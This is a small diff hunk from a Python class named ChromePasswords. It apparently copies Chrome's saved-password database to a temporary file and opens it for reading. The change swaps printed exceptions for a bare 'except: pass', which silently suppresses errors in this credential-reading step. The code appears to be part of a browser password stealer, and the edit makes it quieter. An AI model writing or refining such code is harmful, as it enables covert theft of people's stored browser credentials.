@@ -1112,8 +1112,8 @@ class ChromePasswords:
                 remove(_temp_path)
             copy(_full_path, _temp_path)
             self.pwsd(_temp_path)
-        except Exception as e:
-            print(e)
+        except:
+            pass
 
     def pwsd(self, db_file):
         conn = connect(db_file)
